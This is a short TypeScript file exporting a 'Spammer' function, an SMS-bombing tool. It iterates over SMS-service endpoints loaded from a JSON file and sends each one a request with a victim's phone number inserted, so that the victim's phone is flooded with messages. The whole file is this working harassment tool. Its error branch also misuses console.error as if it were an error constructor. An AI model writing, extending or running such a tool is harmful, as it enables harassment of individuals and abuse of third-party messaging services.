import axios from "axios"
import * as smsApiData from "./smsApi.json"
import { error } from "console"

async function sendRequest(
  url : string,
  method : string,
  headers : {[key : string]  : string},
  data : any
) {
  switch (method.toLowerCase()) {
    case "get":
      return await axios.get(url, {
        headers
      })
    case "post":
      return await axios.post(url, data, {
        headers
      })
    default:
      throw error("invalid method")
  }
}

export async function Spammer(target : number) {
  for (let key in smsApiData) {
    if (key === "default") continue
    
    const apiData = smsApiData[key]
    await sendRequest(
      apiData.url.replace("${target}" , target),
      apiData.method,
      apiData.headers,
      JSON.parse(JSON.stringify(apiData.data).replace("${target}" , target.toString()))
    )
  }
}